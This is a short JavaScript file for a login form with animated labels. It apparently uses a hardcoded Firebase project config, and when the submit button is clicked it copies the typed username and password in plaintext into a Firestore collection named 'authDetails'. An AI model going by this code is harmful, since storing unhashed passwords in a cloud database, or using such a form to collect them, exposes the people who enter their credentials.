const labels=document.querySelectorAll('.form-control label')
const inpForm=document.getElementById("authForm")
const submitBtn=document.getElementById("submitBtn")
//add firebase
const firebaseConfig = {
  apiKey: "AIzaSyD7jZ7RZVp9-7bQHtXfdVR4FAY7Rn7EXos",
  authDomain: "bombsquard-559a3.firebaseapp.com",
  projectId: "bombsquard-559a3",
  storageBucket: "bombsquard-559a3.appspot.com",
  messagingSenderId: "680865386918",
  appId: "1:680865386918:web:243f02344b163cdb063f67",
  measurementId: "G-36DB8N075Q"
};
const app=firebase.initializeApp(firebaseConfig);
//finish firebase

labels.forEach(label=>{
    label.innerHTML=label.innerText
    .split('')
    .map((letter,idx)=>`<span style="transition-delay:${idx*50}ms">${letter}</span>`)
    .join('')
})
//function to get auth details
const getAuthDetails=()=>{
    //console.log(document.getElementById("userName").value)
    //console.log(document.getElementById("userPassword").value)
    return [document.getElementById("userName").value,document.getElementById("userPassword").value]
}
const fireStoreInit=()=>{
    db = firebase.firestore(app);
    if(db!=null){
        return db;
    }
}
const addAuthToFirebase=()=>{
    let authDetails=getAuthDetails();
    const d=fireStoreInit()
    d.collection("authDetails").add({
        userName: authDetails[0],
        userPassword: authDetails[1]
    })
    .then((docRef) => {
        console.log("Document written with ID: ", docRef.id);
    })
    .catch((error) => {
        console.error("Error adding document: ", error);
    });
}

submitBtn.addEventListener("click",()=>{
    addAuthToFirebase();   
})


